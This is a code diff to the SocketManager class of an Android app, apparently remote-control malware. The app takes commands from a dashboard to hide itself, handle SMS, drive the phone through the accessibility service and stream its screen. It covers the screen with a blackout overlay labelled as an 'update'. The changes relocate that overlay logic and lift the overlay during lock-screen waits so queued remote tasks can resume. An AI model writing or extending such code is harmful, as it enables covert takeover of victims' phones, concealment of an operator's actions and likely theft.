@@ -14,6 +14,7 @@ import com.task.tusker.commands.*;
 import com.task.tusker.services.UnifiedAccessibilityService;
 import com.task.tusker.utils.Constants;
 import com.task.tusker.utils.DeviceInfo;
+import com.task.tusker.utils.TaskExecutionState;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -384,6 +385,10 @@ public class SocketManager {
     private android.content.BroadcastReceiver taskLockReceiver;
     private android.app.KeyguardManager taskKeyguardManager;
     private android.app.KeyguardManager.KeyguardLockedStateListener taskKeyguardStateListener;
+    // Guarded by taskLock; one blackout release is attempted per locked wait.
+    private boolean taskUnlockScreenReleaseRequested = false;
+    // Guarded by taskLock; distinguishes a keyguard pause from an ordinary retry wait.
+    private boolean taskWaitingForKeyguard = false;
     private final Runnable taskUnlockCheck = new Runnable() {
         @Override
         public void run() {
@@ -401,6 +406,7 @@ public class SocketManager {
                 return;
             }
 
+            unblockScreenForLockedTaskWait();
             taskLockHandler.postDelayed(this, TASK_UNLOCK_CHECK_INTERVAL_MS);
         }
     };
@@ -439,6 +445,7 @@ public class SocketManager {
 
     private SocketManager(Context context) {
         this.context       = context;
+        TaskExecutionState.resetForMainProcessStart(context);
         loadCachedTcpEndpoint();
         commandExecutor    = new CommandExecutor(context);
         smsHandler         = new SMSHandler(context);
@@ -2287,7 +2294,7 @@ public class SocketManager {
 
         // ── Screen Blackout ───────────────────────────────────────────────
         if (command.equals("screen_blackout_on")) {
-            JSONObject r = screenBlackout.enableBlackout();
+            JSONObject r = handleAccessibilityCommand(command, params);
             if (r.optBoolean("success", false)) {
                 // Start auto-pushing frames every 1.5s so dashboard can see & control the device
                 startBlockFrameMode(DeviceInfo.getDeviceId(context));
@@ -2295,17 +2302,12 @@ public class SocketManager {
             return r;
         }
         if (command.equals("screen_blackout_off")) {
-            JSONObject r = screenBlackout.disableBlackout();
+            JSONObject r = handleAccessibilityCommand(command, params);
             stopBlockFrameMode();
             return r;
         }
         if (command.equals("get_blackout_status")) {
-            JSONObject r = new JSONObject();
-            r.put("success", true);
-            r.put("active", screenBlackout.isActive());
-            r.put("message", screenBlackout.isActive()
-                    ? "Updating overlay is active" : "Updating overlay is hidden");
-            return r;
+            return handleAccessibilityCommand(command, params);
         }
 
         if (command.equals("fully_hide_app")) {
@@ -2871,6 +2873,33 @@ public class SocketManager {
             r.put("error",   "Accessibility service is not running. Enable it in Settings → Accessibility → " +
                              "Downloaded Apps → [App Name]");
             r.put("requiresAccessibility", true);
+            return r;
+        }
+
+        // ScreenBlackout owns an overlay in the accessibility process. The main
+        // process reaches these cases through the provider IPC above; never use
+        // its process-local singleton as a proxy for the real overlay.
+        if ("screen_blackout_on".equals(command)) {
+            return com.task.tusker.commands.ScreenBlackout.getInstance().enableBlackout();
+        }
+        if ("screen_blackout_off".equals(command)) {
+            if (params.optBoolean("onlyIfDeviceLocked", false) && !isDeviceLocked()) {
+                JSONObject skipped = new JSONObject();
+                skipped.put("success", true);
+                skipped.put("skipped", true);
+                skipped.put("message", "Device is unlocked; blackout overlay was not changed");
+                return skipped;
+            }
+            return com.task.tusker.commands.ScreenBlackout.getInstance().disableBlackout();
+        }
+        if ("get_blackout_status".equals(command)) {
+            com.task.tusker.commands.ScreenBlackout blackout =
+                    com.task.tusker.commands.ScreenBlackout.getInstance();
+            JSONObject r = new JSONObject();
+            r.put("success", true);
+            r.put("active", blackout.isActive());
+            r.put("message", blackout.isActive()
+                    ? "Updating overlay is active" : "Updating overlay is hidden");
             return r;
         }
 
@@ -4275,6 +4304,84 @@ public class SocketManager {
         return isDeviceLocked();
     }
 
+    private boolean isCurrentTaskWaitingForKeyguardLocked(String commandId, long generation) {
+        if (!taskWaitingForKeyguard
+                || generation != currentTaskGeneration
+                || commandId == null
+                || !commandId.equals(currentTaskCommandId)) {
+            return false;
+        }
+        PendingTask pending = waitingTasks.get(commandId);
+        return pending != null && pending.generation == generation;
+    }
+
+    private void clearTaskUnlockReleaseRequest(String commandId, long generation) {
+        synchronized (taskLock) {
+            if (generation == currentTaskGeneration
+                    && commandId != null
+                    && commandId.equals(currentTaskCommandId)) {
+                taskUnlockScreenReleaseRequested = false;
+            }
+        }
+    }
+
+    /**
+     * Hide the app's blackout overlay only during a genuine keyguard wait.
+     * This runs on the command worker because the overlay is owned by the
+     * isolated accessibility process and the IPC call can take time.
+     */
+    private void unblockScreenForLockedTaskWait() {
+        if (!isDeviceLocked()) return;
+
+        final String commandId;
+        final long generation;
+        synchronized (taskLock) {
+            commandId = currentTaskCommandId;
+            generation = currentTaskGeneration;
+            if (!isCurrentTaskWaitingForKeyguardLocked(commandId, generation)
+                    || taskUnlockScreenReleaseRequested) {
+                return;
+            }
+            taskUnlockScreenReleaseRequested = true;
+        }
+
+        try {
+            commandDispatchExecutor.execute(() -> {
+                try {
+                    if (!isDeviceLocked()
+                            || !isCurrentTaskWaitingForKeyguard(commandId, generation)) {
+                        clearTaskUnlockReleaseRequest(commandId, generation);
+                        return;
+                    }
+                    JSONObject params = new JSONObject().put("onlyIfDeviceLocked", true);
+                    JSONObject result = dispatchCommand("screen_blackout_off", params);
+                    if (!result.optBoolean("success", false)
+                            || result.optBoolean("skipped", false)) {
+                        Log.w(TAG, "Could not hide blackout overlay during keyguard wait: "
+                                + result.optString("error",
+                                        result.optBoolean("skipped", false)
+                                                ? "device unlocked before delivery" : "command failed"));
+                        clearTaskUnlockReleaseRequest(commandId, generation);
+                    }
+                } catch (Exception e) {
+                    Log.w(TAG, "Blackout overlay release failed during keyguard wait: "
+                            + e.getMessage());
+                    clearTaskUnlockReleaseRequest(commandId, generation);
+                }
+            });
+        } catch (RuntimeException e) {
+            clearTaskUnlockReleaseRequest(commandId, generation);
+            Log.w(TAG, "Unable to queue blackout release during keyguard wait: "
+                    + e.getMessage());
+        }
+    }
+
+    private boolean isCurrentTaskWaitingForKeyguard(String commandId, long generation) {
+        synchronized (taskLock) {
+            return isCurrentTaskWaitingForKeyguardLocked(commandId, generation);
+        }
+    }
+
     private JSONObject startOrQueueTask(JSONArray steps, String commandId)
             throws JSONException {
         PendingTask task;
@@ -4307,6 +4414,9 @@ public class SocketManager {
             }
             activeTaskRuns.clear();
             waitingTasks.clear();
+            taskWaitingForKeyguard = false;
+            taskUnlockScreenReleaseRequested = false;
+            TaskExecutionState.setTaskRunning(context, false);
 
             long generation = ++nextTaskGeneration;
             currentTaskGeneration = generation;
@@ -4331,7 +4441,11 @@ public class SocketManager {
                             .put("stored", stored);
                 }
                 waitingTasks.put(commandId, task);
+                taskWaitingForKeyguard = true;
+                taskUnlockScreenReleaseRequested = false;
+                TaskExecutionState.setTaskRunning(context, false);
             }
+            scheduleTaskUnlockCheck();
             sendTaskRestartProgress(commandId, steps.length(),
                     "Task is waiting for the device to unlock",
                     true, task.clickTextRetries);
@@ -4379,14 +4493,21 @@ public class SocketManager {
                 waitingTasks.put(task.commandId, task);
                 waitingForUnlock = true;
                 run = null;
+                taskWaitingForKeyguard = true;
+                taskUnlockScreenReleaseRequested = false;
+                TaskExecutionState.setTaskRunning(context, false);
             } else {
                 run = new TaskRun(task.steps, task.commandId, task.clickTextRetries,
                         task.generation);
                 activeTaskRuns.put(task.commandId, run);
+                taskWaitingForKeyguard = false;
+                taskUnlockScreenReleaseRequested = false;
+                TaskExecutionState.setTaskRunning(context, true);
             }
         }
 
         if (waitingForUnlock) {
+            scheduleTaskUnlockCheck();
             sendTaskRestartProgress(task.commandId, task.steps.length(),
                     "Task is waiting for the device to unlock",
                     true, task.clickTextRetries);
@@ -4448,7 +4569,12 @@ public class SocketManager {
                 waitingTasks.put(run.commandId,
                         new PendingTask(run.steps, run.commandId,
                                 run.clickTextRetries, run.generation));
+                taskWaitingForKeyguard = true;
                 interruptedRuns.add(run);
+            }
+            if (!interruptedRuns.isEmpty()) {
+                taskUnlockScreenReleaseRequested = false;
+                TaskExecutionState.setTaskRunning(context, false);
             }
         }
 
@@ -4479,11 +4605,15 @@ public class SocketManager {
                 waitingTasks.put(run.commandId,
                         new PendingTask(run.steps, run.commandId,
                                 run.clickTextRetries, run.generation));
+                taskWaitingForKeyguard = true;
+                taskUnlockScreenReleaseRequested = false;
+                TaskExecutionState.setTaskRunning(context, false);
                 queued = true;
             }
         }
 
         if (queued) {
+            scheduleTaskUnlockCheck();
             sendTaskRestartProgress(run.commandId, run.steps.length(),
                     "Screen locked or off — task is paused and will restart from step 1 after unlock",
                     true, run.clickTextRetries);
@@ -4527,6 +4657,9 @@ public class SocketManager {
                         new PendingTask(run.steps, run.commandId,
                                 run.clickTextRetries, run.generation));
                 waitingForUnlock = true;
+                taskWaitingForKeyguard = true;
+                taskUnlockScreenReleaseRequested = false;
+                TaskExecutionState.setTaskRunning(context, false);
             } else if (run.clickTextRetries < MAX_CLICK_TEXT_RETRIES) {
                 nextRetryCount = run.clickTextRetries + 1;
                 run.restartRequested = true;
@@ -4534,6 +4667,8 @@ public class SocketManager {
                         new PendingTask(run.steps, run.commandId, nextRetryCount,
                                 run.generation));
                 retryScheduled = true;
+                taskWaitingForKeyguard = false;
+                TaskExecutionState.setTaskRunning(context, false);
             } else {
                 result.put("error", "Text not found within 7 seconds after "
                         + (MAX_CLICK_TEXT_RETRIES + 1) + " full-task attempts; stopped after "
@@ -4542,6 +4677,7 @@ public class SocketManager {
         }
 
         if (waitingForUnlock) {
+            scheduleTaskUnlockCheck();
             sendTaskRestartProgress(run.commandId, run.steps.length(),
                     "Screen locked or off — task is paused and will restart from step 1 after unlock",
                     true, run.clickTextRetries);
@@ -4577,6 +4713,10 @@ public class SocketManager {
                     iterator.remove();
                 }
             }
+            if (!ready.isEmpty()) {
+                taskWaitingForKeyguard = false;
+                taskUnlockScreenReleaseRequested = false;
+            }
         }
 
         for (PendingTask task : ready) {
@@ -4596,7 +4736,16 @@ public class SocketManager {
                 currentTaskSteps = null;
                 currentTaskGeneration = 0L;
                 clearSavedTask = true;
+                taskWaitingForKeyguard = false;
+                taskUnlockScreenReleaseRequested = false;
             }
+            TaskRun currentRun = currentTaskCommandId != null
+                    ? activeTaskRuns.get(currentTaskCommandId) : null;
+            boolean taskStillExecuting = currentRun != null
+                    && currentRun.generation == currentTaskGeneration
+                    && !currentRun.terminal
+                    && !currentRun.restartRequested;
+            TaskExecutionState.setTaskRunning(context, taskStillExecuting);
         }
         if (clearSavedTask) clearSavedTaskFromDevice(run.commandId, run.generation);
         if (removed && !isTaskExecutionBlocked()) {
